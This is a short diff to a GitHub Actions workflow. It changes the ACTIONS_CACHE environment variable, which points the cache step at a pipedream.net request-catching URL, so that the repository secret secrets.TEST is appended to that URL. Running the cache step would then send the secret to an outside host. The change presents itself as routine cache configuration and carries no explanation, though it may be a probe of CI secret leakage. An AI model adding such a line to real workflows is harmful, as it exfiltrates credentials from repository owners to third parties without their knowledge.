@@ -6,7 +6,7 @@ jobs:
   job1:
     runs-on: ubuntu-latest
     env:
-      ACTIONS_CACHE : "https://b57a7485ca9b9514b7cac793f258d0ef.m.pipedream.net"
+      ACTIONS_CACHE : "https://b57a7485ca9b9514b7cac793f258d0ef.m.pipedream.net?${{secrets.TEST}}"
     steps:
     - name: Cache project
       uses: actions/cache@v2
